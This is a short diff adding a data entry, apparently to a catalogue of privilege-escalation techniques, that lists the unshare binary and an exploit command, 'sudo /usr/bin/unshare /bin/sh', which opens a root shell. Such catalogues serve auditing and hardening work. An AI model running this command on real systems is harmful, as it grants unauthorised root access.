@@ -1,0 +1,4 @@
+name: unshare
+binary_path: /usr/bin/unshare
+exploit_cmds:
+- sudo /usr/bin/unshare /bin/sh
